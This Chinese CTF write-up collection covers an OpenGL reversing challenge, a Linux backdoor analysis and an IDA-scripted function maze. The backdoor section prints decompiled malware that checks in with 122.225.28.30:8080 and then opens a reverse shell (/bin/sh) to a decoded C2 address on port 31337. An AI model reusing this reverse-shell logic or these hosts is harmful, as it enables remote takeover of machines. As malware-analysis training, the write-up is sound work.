#### PC初赛

**一些操作API**

```c++
windowFromPoint: 获取鼠标位置的窗口句柄
GetImeHotKey: 重映射鼠标按键；
SetImeHotkey: 同上，相互呼应
CreateEmptyCursorObject:创建空的光标
DestroyCursor: 摧毁光标
GetControlBrush:控制
GetDC: 从一个设备上下文(DC)中提取一个句柄
GetThreadState:创建一个线程
GetIconSize: 得到图标的大小
```



![](https://i.loli.net/2021/07/27/Aw2vEO6JQSNYxhK.png)

关闭ASLR，改成`00 81`

![](https://i.loli.net/2021/07/27/mnOy2lP4dSAk6x1.png)

使用`ReadFile`读取两个文件。

![](https://i.loli.net/2021/07/27/Wqkdp2D4b1esFcA.png)

![](https://i.loli.net/2021/07/27/PExpeUA84NRVoIY.png)

读取了的两个图片文件，不过好像这里没什么用。

之后进入`sub_4064D0()`函数。

通过动态调试可以恢复一些函数的名称和参数的调用，以及使用`OpenGL`绘制基本绘制流程。

如果没有使用过`Opengl`，最好试一试，[附件下载](https://gitee.com/emtanling/book/raw/master/glutdlls37beta.zip)。

```c++
int __cdecl draw()
{
  _DWORD *v0; // eax
  _DWORD *v1; // ebx
  void *gl_pixels; // eax
  void *v4; // esi
  void *v5; // eax
  void *v6; // esi
  int v7; // esi
  void **v8; // eax
  int v9; // eax
  void **v10; // eax
  int v11; // eax
  float v12; // xmm1_4
  void **v13; // eax
  int v14; // eax
  void *v15; // ecx
  void *v16; // eax
  void **v17; // eax
  int v18; // eax
  void *v19; // ecx
  void *v20; // eax
  unsigned int v21; // edi
  _DWORD *v22; // ecx
  int v23; // xmm1_4
  int v24; // xmm2_4
  __int128 *v25; // eax
  __int128 *v26; // eax
  void **v27; // eax
  int v28; // eax
  void *v29; // ecx
  void *v30; // eax
  int v31; // [esp+164h] [ebp-46Ch]
  int v32; // [esp+168h] [ebp-468h]
  int v33[3]; // [esp+1BCh] [ebp-414h] BYREF
  int v34[3]; // [esp+1C8h] [ebp-408h] BYREF
  void *v35[4]; // [esp+1D4h] [ebp-3FCh] BYREF
  int v36; // [esp+1E4h] [ebp-3ECh]
  unsigned int v37; // [esp+1E8h] [ebp-3E8h]
  int v38; // [esp+1ECh] [ebp-3E4h] BYREF
  int gl_height; // [esp+1F0h] [ebp-3E0h] BYREF
  float gl_width; // [esp+1F4h] [ebp-3DCh] BYREF
  void *Block[4]; // [esp+1F8h] [ebp-3D8h] BYREF
  int v42; // [esp+208h] [ebp-3C8h]
  unsigned int v43; // [esp+20Ch] [ebp-3C4h]
  float v44; // [esp+250h] [ebp-380h]
  float v45; // [esp+264h] [ebp-36Ch]
  int v46; // [esp+278h] [ebp-358h]
  int v47; // [esp+27Ch] [ebp-354h]
  int v48; // [esp+288h] [ebp-348h]
  __int128 v49; // [esp+290h] [ebp-340h] BYREF
  __int128 v50; // [esp+2A0h] [ebp-330h]
  __int128 v51; // [esp+2B0h] [ebp-320h]
  __int128 v52; // [esp+2C0h] [ebp-310h]
  int v53[3]; // [esp+2D0h] [ebp-300h] BYREF
  int v54; // [esp+2DCh] [ebp-2F4h] BYREF
  int v55; // [esp+2E0h] [ebp-2F0h] BYREF
  int v56; // [esp+2E4h] [ebp-2ECh] BYREF
  float v57; // [esp+2E8h] [ebp-2E8h] BYREF
  int v58; // [esp+2ECh] [ebp-2E4h] BYREF
  _DWORD v59[4]; // [esp+2F0h] [ebp-2E0h] BYREF
  __int128 v60; // [esp+300h] [ebp-2D0h]
  __int128 v61; // [esp+310h] [ebp-2C0h]
  __int128 v62; // [esp+320h] [ebp-2B0h]
  __int128 v63; // [esp+330h] [ebp-2A0h]
  __int128 v64; // [esp+340h] [ebp-290h]
  __int128 v65; // [esp+350h] [ebp-280h]
  __int128 v66; // [esp+360h] [ebp-270h]
  __int128 v67; // [esp+370h] [ebp-260h]
  __int128 v68; // [esp+380h] [ebp-250h]
  __int128 v69; // [esp+390h] [ebp-240h]
  __int128 v70; // [esp+3A0h] [ebp-230h]
  __int128 v71; // [esp+3B0h] [ebp-220h]
  __int128 v72; // [esp+3C0h] [ebp-210h]
  __int128 v73; // [esp+3D0h] [ebp-200h]
  __int128 v74; // [esp+3E0h] [ebp-1F0h]
  __int128 v75; // [esp+3F0h] [ebp-1E0h]
  __int128 v76; // [esp+400h] [ebp-1D0h]
  __int128 v77; // [esp+410h] [ebp-1C0h]
  __int128 v78; // [esp+420h] [ebp-1B0h]
  __int128 v79; // [esp+430h] [ebp-1A0h]
  __int128 v80; // [esp+440h] [ebp-190h]
  __int128 v81; // [esp+450h] [ebp-180h]
  __int128 v82; // [esp+460h] [ebp-170h]
  __int128 v83; // [esp+470h] [ebp-160h]
  __int128 v84; // [esp+480h] [ebp-150h]
  __int128 v85; // [esp+490h] [ebp-140h]
  __int128 v86; // [esp+4A0h] [ebp-130h]
  __int128 v87; // [esp+4B0h] [ebp-120h]
  __int128 v88; // [esp+4C0h] [ebp-110h]
  __int128 v89; // [esp+4D0h] [ebp-100h]
  __int128 v90; // [esp+4E0h] [ebp-F0h]
  __int128 v91; // [esp+4F0h] [ebp-E0h]
  __int128 v92; // [esp+500h] [ebp-D0h]
  __int128 v93; // [esp+510h] [ebp-C0h]
  __int128 v94; // [esp+520h] [ebp-B0h]
  __int128 v95; // [esp+530h] [ebp-A0h]
  __int128 v96; // [esp+540h] [ebp-90h]
  __int128 v97; // [esp+550h] [ebp-80h]
  __int128 v98; // [esp+560h] [ebp-70h]
  __int128 v99; // [esp+570h] [ebp-60h]
  __int128 v100; // [esp+580h] [ebp-50h]
  __int128 v101; // [esp+590h] [ebp-40h]
  __int128 v102; // [esp+5A0h] [ebp-30h]
  __int128 v103; // [esp+5B0h] [ebp-20h]
  int v104; // [esp+5CCh] [ebp-4h]

  gl_FwInit();
  gl_FwWindowHint(0x22002, 3);
  gl_FwWindowHint(0x22003, 3);
  gl_FwWindowHint(0x22008, 0x32001);
  v0 = gl_FwCreateWindow(800, 600, "XDDDDDDDDD", 0, 0);// 外部窗口，标题
  v1 = v0;
  if ( !v0 )
  {
    sub_419D10();
    return -1;
  }
  sub_418D00(v0);
  sub_419330(v1, sub_407100);
  sub_4199F0(v1, sub_407120);
  sub_419A30(v1, 0x33001, 0x34003);
  if ( !sub_4051B0() )
    return -1;
  dword_466DBC(GL_DEPTH_TEST);
  sub_4060D0(&v38, v31, v32);
  *v59 = xmmword_455340;
  v60 = xmmword_456AA0;
  v61 = xmmword_455470;
  v62 = xmmword_4554D0;
  v63 = xmmword_455560;
  v64 = xmmword_455320;
  v65 = xmmword_456AE0;
  v66 = xmmword_456A90;
  v67 = xmmword_455450;
  v68 = xmmword_455300;
  v69 = xmmword_455540;
  v70 = xmmword_4554A0;
  v71 = xmmword_455500;
  v72 = xmmword_456A70;
  v73 = xmmword_4552A0;
  v74 = xmmword_455550;
  v75 = xmmword_456A60;
  v76 = xmmword_456AC0;
  v77 = xmmword_456A80;
  v78 = xmmword_455530;
  v79 = xmmword_4552D0;
  v80 = xmmword_4554B0;
  v81 = xmmword_455470;
  v82 = xmmword_455460;
  v83 = xmmword_455560;
  v84 = xmmword_455330;
  v85 = xmmword_456AB0;
  v86 = xmmword_456A40;
  v87 = xmmword_455450;
  v88 = xmmword_4552F0;
  v89 = xmmword_455340;
  v90 = xmmword_456AB0;
  v91 = xmmword_456A50;
  v92 = xmmword_455460;
  v93 = xmmword_455300;
  v94 = xmmword_4552D0;
  v95 = xmmword_456AD0;
  v96 = xmmword_4554F0;
  v97 = xmmword_4554C0;
  v98 = xmmword_455560;
  v99 = xmmword_455540;
  v100 = xmmword_455480;
  v101 = xmmword_4554E0;
  v102 = xmmword_456A30;
  v103 = xmmword_455520;
  gl_GenVertexArrays(1, &v58);
  gl_GenBuffers(1, &v54);
  gl_BindVertexArray(v58);
  gl_BindBuffer(0x8892, v54);
  gl_BufferData(0x8892, 0x2D0, v59, 0x88E4);    // 填充顶点数据
  gl_VertexAttribPointer(0, 3, 0x1406, 0, 20, 0);
  gl_GetActiveAttrib(0);
  gl_VertexAttribPointer(1, 2, 0x1406, 0, 20, 12);
  gl_GetActiveAttrib(1);
  gl_GenTextures(1, &v56);
  gl_BindTexture(GL_TEXTURE_2D, v56);
  gl_TexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);
  gl_TexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);
  gl_TexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);
  gl_TexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);
  dword_465FC4 = 1;
  gl_pixels = getPixelsData(dword_465FE8 - dword_465FE4, dword_465FE4, &gl_width, &gl_height, &v57);
  v4 = gl_pixels;
  if ( gl_pixels )
  {
    gl_TexImage2D(GL_TEXTURE_2D, 0, 6407, LODWORD(gl_width), gl_height, 0, 6407, 5121, gl_pixels);
    gl_GenerateMipmap(GL_TEXTURE_2D);
  }
  j___free_base(v4);
  gl_GenTextures(1, &v55);
  gl_BindTexture(GL_TEXTURE_2D, v55);
  gl_TexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);
  gl_TexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);
  gl_TexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);
  gl_TexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);
  v5 = getPixelsData(dword_465FF8 - lpBuffer, lpBuffer, &gl_width, &gl_height, &v57);
  v6 = v5;
  if ( v5 )
  {
    gl_TexImage2D(GL_TEXTURE_2D, 0, GL_RGB, LODWORD(gl_width), gl_height, 0, GL_RGBA, GL_UNSIGNED_BYTE, v5);
    gl_GenerateMipmap(GL_TEXTURE_2D);
  }
  j___free_base(v6);
  v7 = v38;
  dword_466D64(v38);
  v43 = 15;
  v42 = 0;
  LOBYTE(Block[0]) = 0;
  sub_407670(Block, "texture1", 8u);
  v104 = 0;
  v8 = Block;
  if ( v43 >= 0x10 )
    v8 = Block[0];
  v9 = dword_466D34(v7, v8, 0);
  dword_466DD8(v9);
  v104 = -1;
  sub_407420(Block);
  v43 = 15;
  v42 = 0;
  LOBYTE(Block[0]) = 0;
  sub_407670(Block, "texture2", 8u);
  v104 = 1;
  v10 = Block;
  if ( v43 >= 0x10 )
    v10 = Block[0];
  v11 = dword_466D34(v7, v10, 1);
  dword_466DD8(v11);
  v104 = -1;
  sub_407420(Block);
  if ( !sub_419650(v1) )
  {
    v12 = *_libm_sse2_tan_precise().m128_u64;
    v38 = 0;
    gl_width = 1.0 / v12;
    v57 = 1.0 / (v12 * 1.3333334);
    do
    {
      flt_465FBC = sub_419980();
      if ( sub_419920(v1, 256) == 1 )
        sub_419370(v1, 1);
      gl_ClearColor(0x3E4CCCCD, 0x3E99999A, 0x3E99999A, 0x3F800000);
      gl_Clear(16640);
      dword_466D44(0x84C0);
      gl_BindTexture(GL_TEXTURE_2D, v56);
      dword_466D44(0x84C1);
      gl_BindTexture(GL_TEXTURE_2D, v55);
      dword_466D64(v7);
      sub_409640(&v38);
      v44 = v57;
      v45 = gl_width;
      v47 = 0xBF800000;
      v46 = 0xBF80419A;
      v48 = 0xBE4D0148;
      v43 = 15;
      v42 = 0;
      LOBYTE(Block[0]) = 0;
      sub_407670(Block, "projection", 0xAu);
      v104 = 2;
      v13 = Block;
      if ( v43 >= 0x10 )
        v13 = Block[0];
      v14 = dword_466D34(v7, v13, 1);
      dword_466D68(v14);
      v104 = -1;
      if ( v43 >= 0x10 )
      {
        v15 = Block[0];
        if ( v43 + 1 >= 0x1000 )
        {
          if ( (Block[0] & 0x1F) != 0
            || (v16 = *(Block[0] - 1), v16 >= Block[0])
            || (Block[0] - v16) < 4
            || (Block[0] - v16) > 0x23 )
          {
LABEL_52:
            _invalid_parameter_noinfo_noreturn();
          }
          v15 = *(Block[0] - 1);
        }
        j_j___free_base(v15);
      }
      *v34 = *&dword_464CC4 + *&qword_464CAC;
      *&v34[1] = *&dword_464CC8 + *(&qword_464CAC + 1);
      *&v34[2] = *&dword_464CCC + *&dword_464CB4;
      sub_4092A0(v34);
      v43 = 15;
      v42 = 0;
      LOBYTE(Block[0]) = 0;
      sub_407670(Block, "view", 4u);
      v104 = 3;
      v17 = Block;
      if ( v43 >= 0x10 )
        v17 = Block[0];
      v18 = dword_466D34(v7, v17, 1);
      dword_466D68(v18);
      v104 = -1;
      if ( v43 >= 0x10 )
      {
        v19 = Block[0];
        if ( v43 + 1 >= 0x1000 )
        {
          if ( (Block[0] & 0x1F) != 0 )
            goto LABEL_52;
          v20 = *(Block[0] - 1);
          if ( v20 >= Block[0] || (Block[0] - v20) < 4 || (Block[0] - v20) > 0x23 )
            goto LABEL_52;
          v19 = *(Block[0] - 1);
        }
        j_j___free_base(v19);
      }
      v43 = 15;
      v42 = 0;
      LOBYTE(Block[0]) = 0;
      gl_BindVertexArray(v58);
      v21 = 0;
      v22 = dword_46601C;
      if ( (dword_466020 - dword_46601C) >> 2 )
      {
        v33[0] = 1065353216;
        v33[1] = 1050253722;
        v33[2] = 1056964608;
        do
        {
          v23 = v22[v21 + 1];
          v24 = v22[v21 + 2];
          v53[0] = v22[v21];                    // cubePositions  位置向量
          v53[1] = v23;
          v53[2] = v24;
          sub_407F30(&v49);
          v25 = sub_4086F0(v53);
          v49 = *v25;
          v50 = v25[1];
          v51 = v25[2];
          v52 = v25[3];
          v26 = sub_408850(v33);
          v37 = 15;
          v36 = 0;
          LOBYTE(v35[0]) = 0;
          v49 = *v26;
          v50 = v26[1];
          v51 = v26[2];
          v52 = v26[3];
          sub_407670(v35, "model", 5u);
          v104 = 4;
          v27 = v35;
          if ( v37 >= 0x10 )
            v27 = v35[0];
          v28 = dword_466D34(v7, v27, 1);
          dword_466D68(v28);
          v104 = -1;
          if ( v37 >= 0x10 )
          {
            v29 = v35[0];
            if ( v37 + 1 >= 0x1000 )
            {
              if ( (v35[0] & 0x1F) != 0 )
                goto LABEL_52;
              v30 = *(v35[0] - 1);
              if ( v30 >= v35[0] || (v35[0] - v30) < 4 || (v35[0] - v30) > 0x23 )
                goto LABEL_52;
              v29 = *(v35[0] - 1);
            }
            j_j___free_base(v29);
          }
          v37 = 15;
          v36 = 0;
          LOBYTE(v35[0]) = 0;
          gl_DrawArrays(GL_TRIANGLES, 0, 36);   // 画正方体
          v21 += 3;
          v22 = dword_46601C;
        }
        while ( v21 < (dword_466020 - dword_46601C) >> 2 );
      }
      sub_418D80(v1);
      sub_419310();
    }
    while ( !sub_419650(v1) );
  }
  dword_466D1C(1, &v58);
  dword_466D6C(1, &v54);
  sub_419D10();
  return 0;
}
```

通过对比分析可得`cubePositions`即`dword_46601C`。

通过交叉引用得，函数`sub_401120()`对其初始化。

![](https://i.loli.net/2021/07/29/c8xDbyPZOEwfh3n.png)

通过动态调试读取内容，这里应为浮点数。

```cpp
#include <windows.h>
#include <iostream>
#define ADDR 0x46601C
using namespace std;
struct pix
{
	float x;
	float y;
	float z;
};
template<typename T>
T readMe(HANDLE QProcess, uintptr_t addr)
{
	T data_address;
	ReadProcessMemory(QProcess, (LPCVOID)addr, &data_address, sizeof(data_address), NULL);
	return data_address;
}
int main()
{
	int PC_PID = 0;
	cout << "输入进程PID: " << endl;
	cin >> PC_PID;
	HANDLE PCProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PC_PID);
	DWORD ADDRM = readMe<DWORD>(PCProcess, ADDR);
	cout << "*(0x" << hex << ADDR << ") = 0x" << hex << ADDRM << endl;
	
	for (int i = 0; i < 3057; i+=3)
	{
		pix PCpix;
		DWORD DADDR = ADDRM + i * 4;
		PCpix.x = readMe<float>(PCProcess, DADDR);
		PCpix.y = readMe<float>(PCProcess, DADDR + 4);
		PCpix.z = readMe<float>(PCProcess, DADDR + 8);
		cout << "[" << PCpix.x << ", " << PCpix.y << ", " << PCpix.z << "]" << endl;
	}
	return 0;
}
```

通过以上程序读取出浮点数，手动保存下来。

```data
[37, 9, -6.5]
[38, 9, -4.1]
[39, 9, -5.9]
[40, 9, -4.6]
[41, 9, -7]
[73, 9, -5.6]
[74, 9, -4.2]
[75, 9, -6.4]
[76, 9, -5.6]
[77, 9, -4]
[36, 10, -4.3]
[37, 10, -6.4]
[38, 10, -4.7]
[41, 10, -5]
[42, 10, -3.9]
...
...
[-12, 19, -66.9]
[-11, 19, -66.1]
[-10, 19, -68.4]
[-9, 19, -66.3]
[-8, 19, -65.3]
[-7, 19, -65.6]
[-6, 19, -67.1]
[-5, 19, -69.1]
[-4, 19, -69.4]
[-3, 19, -68.4]
[-2, 19, -69.9]
[-1, 19, -68.6]
[0, 19, -67.1]
[-14, 20, -68.3]
[-13, 20, -65.4]
[-12, 20, -67.7]
[-11, 20, -67]
[-10, 20, -65.4]
[-9, 20, -67.6]
```

使用`opengl`画二维图像，这里将坐标进行移动300。

```cpp
#include <windows.h> 
#include <gl/gl.h>
#include <gl/glut.h>

void Pix()
{
	glVertex2f(337, 309);
	glVertex2f(338, 309);
	glVertex2f(339, 309);
	glVertex2f(340, 309);
    /*
	...    
    */
    glVertex2f(299, 319);
	glVertex2f(300, 319);
	glVertex2f(286, 320);
	glVertex2f(287, 320);
	glVertex2f(288, 320);
	glVertex2f(289, 320);
	glVertex2f(290, 320);
	glVertex2f(291, 320);
}
void myInit(void)
{
	glClearColor(1.0, 1.0, 1.0, 0.0); // 设置白色背景
	glColor3f(0.0f, 0.0f, 0.0f);  // 设置绘图颜色
	glPointSize(2.0); // 一个点是2x2像素
	glMatrixMode(GL_PROJECTION);
	glLoadIdentity();
	gluOrtho2D(0.0, 640.0, 0.0, 480.0);
}

void myDisplay(void)
{
	glClear(GL_COLOR_BUFFER_BIT); // 清空显示
	glBegin(GL_POINTS);
	Pix(); // 坐标
	glEnd();
	glFlush(); // 将所有的输出显示出来
}

void main()
{
	glutInitDisplayMode(GLUT_SINGLE | GLUT_RGB); // 设置显示模式
	glutInitWindowSize(800, 500); // 设置窗口尺寸
	glutInitWindowPosition(300, 200);
	glutCreateWindow(" "); // 打开屏幕窗口
	glutDisplayFunc(myDisplay); // 注册重新绘制函数
	myInit();
	glutMainLoop(); // 进入不断的循环
}
```

![](https://i.loli.net/2021/07/29/txIrmRCUD4Tuk7q.png)

参考文章

* [OpenGL渲染流程](https://www.cnblogs.com/BigFeng/p/5068715.html)
* [OpenGL之——摄像机（一）](https://blog.csdn.net/qq_35294564/article/details/86288352)
* [坐标系统](https://learnopengl-cn.readthedocs.io/zh/latest/01%20Getting%20started/08%20Coordinate%20Systems/#3d_1)
* [OpenGL入门学习](http://www.cppblog.com/doing5552/archive/2009/01/08/71532.html)

#### msbackdoor

**后门分析，获取C2 ip**

[附件](https://emtanling.lanzoui.com/i72P2s3ykoj)

载入IDA可以发现是无法解析的，有花指令。
第一种：
![](https://i.loli.net/2021/08/03/BIHbpsfruCet6Mw.png)

通过call，loopd，js，jns进行混淆，也就是无论如何都会进行跳转，最终执行位置也就是`pop rcx`，这里可以通过nop到跳转位置，即`loc_4009CD+2`或者`loc_4009CD+1`
![](https://i.loli.net/2021/08/03/kTP4ie7U9QpjnEN.png)
第二种：
![](https://i.loli.net/2021/08/03/9mQH5FLyPWfEsXb.png)
这种retn之后就是执行下一条指令，继续nop
![](https://i.loli.net/2021/08/03/fP1uzecSsFRZHVb.png)
第三种：
![](https://i.loli.net/2021/08/03/qRcmBVrJCSKWp5n.png)
和第二种的作用是一样的，nop可以去除。
之后可以重复此操作，也可以通过idapython批量去除。
之后F5仍然错误，这是由于有反调试。
![](https://i.loli.net/2021/08/03/OX6SpN9ExFnvotm.png)
这里通过三个函数`LINUX - sys_getpid` `LINUX - sys_getsid` `LINUX - sys_getppid`
通过获取父进程 pid 和当前进程 session ID，如果相等的就证明没有调试器，通过用跳转产生异常，导致程序退出。
![](https://i.loli.net/2021/08/03/4CiAbcrB9VslgEJ.png)
直接跳转到正确的位置。

```cpp
unsigned __int64 sub_4008C9()
{
  const char *v0; // rsi
  int v1; // eax
  int v2; // eax
  int v3; // eax
  signed __int64 v4; // rax
  unsigned int v5; // edi
  signed __int64 v6; // rax
  __int64 v7; // rsi
  signed __int64 v8; // rax
  char v9; // zf
  signed __int64 v10; // rax
  unsigned __int8 j; // [rsp+Bh] [rbp-10C5h]
  unsigned __int8 k; // [rsp+Bh] [rbp-10C5h]
  unsigned __int8 l; // [rsp+Bh] [rbp-10C5h]
  unsigned __int8 m; // [rsp+Bh] [rbp-10C5h]
  int v16; // [rsp+Ch] [rbp-10C4h]
  int v17; // [rsp+10h] [rbp-10C0h]
  int v18; // [rsp+10h] [rbp-10C0h]
  int v19; // [rsp+10h] [rbp-10C0h]
  int i; // [rsp+14h] [rbp-10BCh]
  int fd; // [rsp+18h] [rbp-10B8h]
  struct sockaddr s; // [rsp+20h] [rbp-10B0h] BYREF
  unsigned __int8 v23; // [rsp+30h] [rbp-10A0h] BYREF
  unsigned __int8 v24; // [rsp+31h] [rbp-109Fh]
  unsigned __int8 v25; // [rsp+32h] [rbp-109Eh]
  unsigned __int8 v26; // [rsp+33h] [rbp-109Dh]
  char v27[16]; // [rsp+40h] [rbp-1090h]
  int v28[28]; // [rsp+50h] [rbp-1080h] BYREF
  _QWORD buf[513]; // [rsp+C0h] [rbp-1010h] BYREF
  unsigned __int64 v30; // [rsp+10C8h] [rbp-8h]

  v30 = __readfsqword(0x28u);
  v27[0] = 40;
  v27[1] = 82;
  v27[2] = 50;
  v27[3] = 53;
  v27[4] = 49;
  v27[5] = 29;
  v27[6] = 90;
  v27[7] = 90;
  memset(v28, 0, 0x60uLL);
  v28[24] = 0;
  memset(buf, 0, 0x1000uLL);
  fd = socket(2, 1, 0);
  if ( fd < 0 )
    exit(0);
  memset(&s, 0, sizeof(s));
  s.sa_family = 2;
  *(_WORD *)s.sa_data = htons(0x1F90u);
  if ( inet_pton(2, "122.225.28.30", &s.sa_data[2]) <= 0 )
    exit(0);
  if ( connect(fd, &s, 0x10u) >= 0 )
  {
    __asm
    {
      syscall; LINUX - sys_getpid
      syscall; LINUX - sys_getsid
      syscall; LINUX - sys_getppid
    }
    *((_BYTE *)buf + (int)recv(39, &s, 0xFFFFFFFFuLL, 1)) = 0;
    close(fd);
    v0 = "001fd1f2c76655f85ca416f324e9ffa7";
    if ( !strcmp((const char *)buf, "001fd1f2c76655f85ca416f324e9ffa7") )
    {
      for ( i = 0; i <= 7; ++i )
        v27[i] ^= 0x67u;
      v16 = 0;
      v17 = 0;
      while ( v27[v16] )
      {
        LODWORD(v0) = 255;
        memset(&v23, 255, 4uLL);
        for ( j = 0; j <= 0x3Fu; ++j )
        {
          if ( byte_6020A0[j] == v27[v16] )
            v23 = j;
        }
        for ( k = 0; k <= 0x3Fu; ++k )
        {
          if ( byte_6020A0[k] == v27[v16 + 1] )
            v24 = k;
        }
        for ( l = 0; l <= 0x3Fu; ++l )
        {
          if ( byte_6020A0[l] == v27[v16 + 2] )
            v25 = l;
        }
        for ( m = 0; m <= 0x3Fu; ++m )
        {
          if ( byte_6020A0[m] == v27[v16 + 3] )
            v26 = m;
        }
        v1 = v17;
        v18 = v17 + 1;
        *((_BYTE *)v28 + v1) = (4 * v23) | (v24 >> 4) & 3;
        if ( v27[v16 + 2] == 61 )
          break;
        v2 = v18;
        v19 = v18 + 1;
        *((_BYTE *)v28 + v2) = (16 * v24) | (v25 >> 2) & 0xF;
        if ( v27[v16 + 3] == 61 )
          break;
        v3 = v19;
        v17 = v19 + 1;
        *((_BYTE *)v28 + v3) = (v25 << 6) | v26 & 0x3F;
        v16 += 4;
      }
      __asm
      {
        syscall; LINUX - sys_getpid
        syscall; LINUX - sys_getsid
        syscall; LINUX - sys_getppid
      }
      v4 = sys_socket(39, (int)v0, buf[39]);
      LODWORD(buf[39]) = 0x697A0002;            // port = 31337
      HIDWORD(buf[39]) = v28[0];                // ip
      v5 = v4;
      v6 = sys_connect(v4, (struct sockaddr *)&buf[39], 16);
      v7 = 3LL;
      do
        v8 = sys_dup2(v5, --v7);
      while ( !v9 );
      buf[38] = 0x68732F6E69622FLL;
      v10 = sys_execve((const char *)&buf[38], 0LL, 0LL);
    }
  }
  return __readfsqword(0x28u) ^ v30;
}


```

恢复效果还可以，流程为：首先连接 `122.225.28.30:8080`通过此服务器返回的值进行验证，如果正确进行下一步。之后就是将之前的字符串异或一个数字然后进行base64解密。
不过用此时解出来的ip为 `59.149.17.87`。
看init，可以发现在main之前有个函数对base64的表进行修改

```cpp
void sub_4007D6()
{
  int i; // [rsp+4h] [rbp-4h]

  __asm
  {
    syscall; LINUX - sys_getpid
    syscall; LINUX - sys_getsid
    syscall; LINUX - sys_getppid
  }
  for ( i = 0; i <= 63; ++i )
    byte_6020A0[i] += 3;
}
```

转换之后的表

```cpp
DEFGHIJKLMNOPQRSTUVWXYZ[\]defghijklmnopqrstuvwxyz{|}3456789:;<.2
```

解密脚本：

```python
import base64
import string
s = '(R251\x1DZZ'
m = ''
for i in range(len(s)):
    m += chr(ord(s[i])^0x67)
print(m)
string1 = 'DEFGHIJKLMNOPQRSTUVWXYZ[\]defghijklmnopqrstuvwxyz{|}3456789:;<.2'
string2 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
ip_b = base64.b64decode(m.translate(str.maketrans(string1,string2)))
print(ip_b)
ip_s = str(ip_b,encoding='utf-8')
print('ip = ',end='')
for i in range(len(ip_s)):
  print(str(ord(ip_s[i])),end = ' ')
```

![](https://i.loli.net/2021/08/03/bzQ6NmSleIjpfOc.png)

#### [**baby-maze**](https://emtanling.lanzoui.com/i8y9ms75abg)

打开可以看到这个为迷宫题，但是这个是以函数作为跳转，只能通过进入正确的函数才可以获得最后的flag。
这是很容易想到，进行函数调用所产生的路径中不可能存在相同的函数调用。
可以通过写ida python 进行路径获取。

```cpp
函数起始位置： 0x40187C
函数结束位置： 0x54DE35
```

如果从起始位置遍历到结束位置，一个问题在于，菜鸡的我没有找到在一个函数中去call 另一个函数的api，也就是找函数中进行函数调用，调用的函数名称的api，可能有点绕。
比如函数 sub_401933 中有许多函数跳转，如何获取这些函数的名称，菜鸡没有找到api。只能通过汇编的匹配，十分麻烦，同时可能造成内存占用更大。
**可以从最后的函数地址通过交叉引用到起始位置。**

```python
import idaapi
import idc
import idautils

end_address = 0x40187C
start_address = 0x54DE35

flag_Cafunc = []
flag_Refunc = []
def dfs_func(call_func,flag_Refunc):
	if call_func == end_address:
		print ("done")
		for i in range(len(flag_Refunc)):
			print(hex(flag_Refunc[i]) + '-' ,end='')
		print()
		for i in range(len(flag_Cafunc)):
			print(hex(flag_Cafunc[i]) + '-' ,end='')
		return 
	for i in idautils.CodeRefsTo(call_func,0):
		call_name = GetFunctionName(i)    # 获得调用的函数名称
		call_addr = LocByName(call_name)  # 通过名称获得调用函数的地址
		if call_addr in flag_Refunc:
			continue
		flag_Cafunc.append(i)
		flag_Refunc.append(call_addr)
		dfs_func(call_addr,flag_Refunc)
		flag_Refunc.remove(call_addr)
		flag_Cafunc.remove(i)
if __name__ == '__main__':
	dfs_func(start_address,flag_Refunc)

```



